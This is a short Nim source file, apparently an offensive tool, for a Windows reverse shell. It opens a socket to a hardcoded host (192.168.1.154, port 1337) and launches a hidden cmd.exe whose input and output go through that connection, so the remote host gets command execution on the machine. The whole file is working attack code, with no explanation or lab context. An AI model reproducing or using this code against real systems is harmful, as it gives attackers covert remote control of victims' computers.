import winim

proc callReverseShell(): bool =
  var 
    ip = "192.168.1.154".cstring
    port: uint16 = 1337
    wsaData: WSADATA

  var wsaStartupResult = WSAStartup(MAKEWORD(2,2), addr wsaData)
  if wsaStartupResult != 0:
    return false

  var soc = WSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = inet_addr(ip)
  sa.sin_port = htons(port)

  var connectResult = connect(soc, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
  if connectResult != 0:
    return false

  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](soc)
  si.hStdOutput = cast[HANDLE](soc)
  si.hStdError = cast[HANDLE](soc)

  CreateProcessA(NULL, "cmd".cstring, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr)
  return true

proc main() = 
  if callReverseShell():
    ExitProcess(0)
  else:
    ExitProcess(1)


when isMainModule:
  main()